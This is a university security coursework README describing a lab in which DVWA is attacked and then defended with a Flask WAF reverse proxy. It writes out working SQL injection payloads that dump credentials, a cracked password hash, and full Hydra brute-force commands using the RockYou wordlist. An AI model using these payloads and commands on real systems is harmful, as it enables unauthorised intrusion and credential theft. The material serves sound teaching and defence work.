# ELEC0138 Security & Privacy

---

## Overview

This repository contains all code, data, and setup documentation for **CW1** (Threat Modelling & Attack Simulation) and **CW2** (Security & Privacy Defence Strategy) of ELEC0138. The coursework simulates a corporate IT infrastructure (AcmeCorp) and demonstrates three realistic attack scenarios using industry-standard ethical hacking tools, followed by a multi-layered Flask WAF reverse proxy that defends against those attacks — all conducted in an isolated VirtualBox lab environment.

---

## Lab Environment

| Machine | OS | IP | Role |
|---|---|---|---|
| Attacker | Kali Linux 2026.1 (ARM64) | 10.0.0.1 | Attack platform |
| Target | Ubuntu Server 24.04 (ARM64) | 10.0.0.2 | DVWA web server |

Both VMs are connected via a VirtualBox internal network named `corpnet` (10.0.0.0/24). No external traffic was involved in any attack.

---

## Attacks Demonstrated

### 1. Network Reconnaissance — Nmap
**Command:**
```bash
nmap -sV -sC -p 80 10.0.0.2
```
**Finding:** Port 80 open, running Apache httpd 2.4.58 (Ubuntu). Server broadcasts its exact version in HTTP response headers — an information disclosure vulnerability (CWE-200) that enables targeted CVE lookups.

**Screenshot:** `figures/nmap_scan.png`

---

### 2. SQL Injection — Manual (DVWA)
**Target:** `http://10.0.0.2/dvwa/vulnerabilities/sqli/`
**Vulnerability:** CWE-89 | OWASP A03:2021 — Injection

**Phase 1 — Boolean injection** (dump all records):
```
1' OR '1'='1
```

**Phase 2 — UNION injection** (exfiltrate credentials):
```
1' UNION SELECT user, password FROM users #
```

**Result:** All 5 employee usernames and MD5 password hashes exfiltrated. Hash `5f4dcc3b5aa765d61d8327deb882cf99` cracked instantly via CrackStation to `password`.

**Screenshots:** `figures/boo_sql_dvwa.png`, `figures/union_sql_dvwa.png`, `figures/password_cracking.png`


### 3. Brute Force — Hydra
**Vulnerability:** CWE-307 | OWASP A07:2021 — Identification and Authentication Failures

**Target:** `http://10.0.0.2/dvwa/vulnerabilities/brute/` (DVWA Brute Force vulnerability page, security level: Low)

**Command (CW1 — direct attack on DVWA, no WAF):**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.2 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect."
```

**Note:** A valid session cookie (`PHPSESSID`) is required to access the authenticated vulnerability page. Log into DVWA as `admin/password`, retrieve the cookie from the browser (F12 → Storage → PHPSESSID), then paste it into the command above.

**Result:** Valid admin credential recovered — `password` — found at attempt 4 of 14,344,399. No rate limiting or account lockout was triggered.

**Screenshots:** `figures/brute_force_admin.png`, `figures/brute_force_login.png`

---

## CW2 — Flask WAF Reverse Proxy Defence

The WAF (`waf_proxy.py`) runs on the Kali machine at port 5000 and sits between the attacker and DVWA, implementing seven sequential defence layers:

| Layer | Name | Mechanism |
|---|---|---|
| 1 | IPS | SQL injection regex filter (CWE-89) |
| 2 | Lockout | Account lockout with exponential backoff (60s → 120s → 240s, cap 1h) |
| 3 | Rate Limit | IP sliding-window rate limit (20 req / 30 s) |
| 4 | Dashboard | Timestamped audit log + real-time web dashboard |
| 5 | Privacy | SHA-256 IP pseudonymisation in all log entries |
| 6 | Log Enc. | AES-256-GCM per-line log encryption at rest |
| 7 | TLS | HTTPS with auto-generated RSA-2048 self-signed certificate |

**Architecture:**
```
Attacker / Hydra  →  WAF (10.0.0.1:5000)  →  DVWA (10.0.0.2)
```

**Dashboard:** `http://10.0.0.1:5000/waf/dashboard`

**Install dependencies (run on Kali):**
```bash
pip install -r requirement.txt --break-system-packages
```

**Start the WAF (run on Kali):**
```bash
python3 waf_proxy.py
```

**Read encrypted audit log (Layer 6):**
```bash
python3 waf_proxy.py --decrypt
```

**Enable HTTPS/TLS mode (Layer 7):**
Set `USE_TLS = True` in `waf_proxy.py`, then access via `https://10.0.0.1:5443`.

### Brute Force — Hydra against WAF (CW2 defence demo)

**Target:** `http://10.0.0.1:5000/dvwa/vulnerabilities/brute/` (traffic intercepted by WAF)

**Command (CW2 — attack routed through WAF, targeting gordonb):**
```bash
hydra -l gordonb -P /usr/share/wordlists/rockyou.txt 10.0.0.1 -s 5000 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect." -t 1 -V -f
```

**Flags explained:**
| Flag | Purpose |
|---|---|
| `10.0.0.1 -s 5000` | Target the WAF proxy instead of DVWA directly |
| `-t 1` | Single thread — required so lockout triggers sequentially |
| `-V` | Verbose — print every attempt |
| `-f` | Stop on first valid credential found |
| `F=Username and/or password incorrect.` | Treat any response containing this string as a failed attempt |

**Note:** Use the same `PHPSESSID` cookie retrieved from `http://10.0.0.1:5000/dvwa/login.php` (via the WAF). The correct password for gordonb is `abc123`, which appears at position 10 in RockYou.

**Expected result:** Account locked after 5 failed attempts. `abc123` at attempt 10 is blocked by the WAF lockout — Hydra finds **0 valid credentials**. Dashboard shows 1 Lockout Event.

**Screenshots:** `figures/waf_brute_gordonb.png`, `figures/dashboard_brute_gordonb.png`, `figures/live_dashboard.png`, `figures/waf_audit_log.png`

---

## How to Replicate

See `setup/lab_setup_commands.sh` for the complete step-by-step terminal commands to build the lab from scratch, including VM network configuration, DVWA installation, WAF deployment, and all attack commands.

Read `setup/setup_notes.md` first — it covers common gotchas such as interface name differences, DVWA prerequisite checks, and manual steps that cannot be scripted.

---

## Disclaimer

All attacks were performed in a fully isolated virtual lab environment for educational purposes only. No real systems were targeted. This work is submitted in accordance with UCL's academic integrity policy.
